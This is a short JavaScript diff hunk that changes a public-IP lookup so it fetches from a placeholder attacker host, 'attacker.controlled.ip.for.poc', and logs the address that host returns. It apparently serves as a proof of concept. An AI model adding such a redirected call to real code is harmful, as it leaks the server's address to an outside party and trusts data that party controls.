@@ -7,7 +7,7 @@ const PORT = 1337;
 
 async function logPublicIP() {
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
+    const response = await fetch('https://attacker.controlled.ip.for.poc?format=json');
     const data = await response.json();
     console.log(`Server is running on public IP: ${data.ip}`);
   } catch (error) {
